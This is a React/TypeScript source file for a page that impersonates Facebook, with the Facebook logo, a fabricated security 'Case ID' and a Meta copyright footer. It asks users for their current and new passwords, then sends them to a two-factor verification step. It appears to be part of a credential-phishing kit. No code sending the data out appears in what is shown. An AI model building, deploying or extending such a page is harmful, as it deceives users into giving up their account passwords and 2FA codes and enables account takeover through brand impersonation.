import React, { useState } from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { LockIcon, TicketIcon, ShieldAlert, EyeIcon, EyeOffIcon } from "lucide-react";

export default function ChangePasswordPage() {
  const [, setLocation] = useLocation();
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [oldPassword, setOldPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showOldPassword, setShowOldPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);

  // Get ticket number from localStorage for consistency across pages
  const ticketNumber = localStorage.getItem('securityTicket') || 
    `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;
  
  // Store ticket number for consistency across pages
  React.useEffect(() => {
    if (!localStorage.getItem('securityTicket')) {
      localStorage.setItem('securityTicket', ticketNumber);
    }
  }, [ticketNumber]);

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    
    if (!oldPassword) {
      newErrors.oldPassword = "Current password is required";
    }
    
    if (!newPassword) {
      newErrors.newPassword = "New password is required";
    } else if (newPassword.length < 8) {
      newErrors.newPassword = "Password must be at least 8 characters";
    }
    
    if (newPassword !== confirmPassword) {
      newErrors.confirmPassword = "Passwords do not match";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (validateForm()) {
      setIsSubmitting(true);
      
      // Simulate processing delay
      setTimeout(() => {
        setIsSubmitting(false);
        // Move to the 2FA verification page
        setLocation("/verify-2fa");
      }, 1500);
    }
  };

  return (
    <>
      <Card className="w-full max-w-2xl mx-auto bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
              <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
              <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
            </div>
          </div>
          
          <div className="md:flex md:items-start mb-8">
            <div className="md:w-1/3 mb-4 md:mb-0 md:pr-6">
              <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Change Your Password</h1>
              <p className="text-gray-600 mb-4">
                As an additional security measure, please change your password to complete the verification process.
              </p>
              
              <div className="bg-blue-50 p-4 rounded-lg mb-6">
                <div className="flex items-start">
                  <ShieldAlert className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
                  <div>
                    <h3 className="font-semibold text-[#1C1E21] text-sm">Password Tips</h3>
                    <ul className="text-xs text-gray-600 mt-1 list-disc pl-4 space-y-1">
                      <li>Use at least 8 characters</li>
                      <li>Include numbers, letters, and special characters</li>
                      <li>Avoid using personal information</li>
                      <li>Don't reuse passwords across websites</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="md:w-2/3">
              <form onSubmit={handleSubmit} className="bg-gray-50 p-6 rounded-lg border border-gray-200">
                <div className="mb-4">
                  <Label htmlFor="oldPassword" className="block text-sm font-medium text-gray-700 mb-1">
                    Current Password <span className="text-red-500">*</span>
                  </Label>
                  <div className="relative">
                    <Input
                      id="oldPassword"
                      type={showOldPassword ? "text" : "password"}
                      value={oldPassword}
                      onChange={(e) => setOldPassword(e.target.value)}
                      className="w-full p-3 pl-10 pr-10 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="Enter your current password"
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      <LockIcon className="h-4 w-4 text-gray-400" />
                    </div>
                    <button 
                      type="button"
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-500"
                      onClick={() => setShowOldPassword(!showOldPassword)}
                    >
                      {showOldPassword ? <EyeOffIcon className="h-4 w-4" /> : <EyeIcon className="h-4 w-4" />}
                    </button>
                  </div>
                  {errors.oldPassword && (
                    <div className="text-red-500 text-xs mt-1">{errors.oldPassword}</div>
                  )}
                </div>
                
                <div className="mb-4">
                  <Label htmlFor="newPassword" className="block text-sm font-medium text-gray-700 mb-1">
                    New Password <span className="text-red-500">*</span>
                  </Label>
                  <div className="relative">
                    <Input
                      id="newPassword"
                      type={showNewPassword ? "text" : "password"}
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full p-3 pl-10 pr-10 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="Enter your new password"
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      <LockIcon className="h-4 w-4 text-gray-400" />
                    </div>
                    <button 
                      type="button"
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-500"
                      onClick={() => setShowNewPassword(!showNewPassword)}
                    >
                      {showNewPassword ? <EyeOffIcon className="h-4 w-4" /> : <EyeIcon className="h-4 w-4" />}
                    </button>
                  </div>
                  {errors.newPassword && (
                    <div className="text-red-500 text-xs mt-1">{errors.newPassword}</div>
                  )}
                </div>
                
                <div className="mb-6">
                  <Label htmlFor="confirmPassword" className="block text-sm font-medium text-gray-700 mb-1">
                    Confirm New Password <span className="text-red-500">*</span>
                  </Label>
                  <div className="relative">
                    <Input
                      id="confirmPassword"
                      type={showConfirmPassword ? "text" : "password"}
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      className="w-full p-3 pl-10 pr-10 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                      placeholder="Confirm your new password"
                    />
                    <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                      <LockIcon className="h-4 w-4 text-gray-400" />
                    </div>
                    <button 
                      type="button"
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-500"
                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    >
                      {showConfirmPassword ? <EyeOffIcon className="h-4 w-4" /> : <EyeIcon className="h-4 w-4" />}
                    </button>
                  </div>
                  {errors.confirmPassword && (
                    <div className="text-red-500 text-xs mt-1">{errors.confirmPassword}</div>
                  )}
                </div>
                
                <div className="flex items-center">
                  <div className="bg-yellow-50 p-2 rounded-md flex items-start flex-grow mr-4">
                    <ShieldAlert className="h-4 w-4 text-yellow-500 mr-1.5 mt-0.5 flex-shrink-0" />
                    <p className="text-xs text-yellow-700">
                      After changing your password, you'll need to verify your identity with a two-factor authentication code.
                    </p>
                  </div>
                  
                  <Button
                    type="submit"
                    disabled={isSubmitting}
                    className="bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-2.5 px-5 rounded-md transition-colors duration-200 min-w-[140px]"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <div className="w-4 h-4 border-t-2 border-b-2 border-white rounded-full animate-spin mr-2"></div>
                        <span>Updating...</span>
                      </div>
                    ) : (
                      "Continue"
                    )}
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className="w-full max-w-2xl mx-auto text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}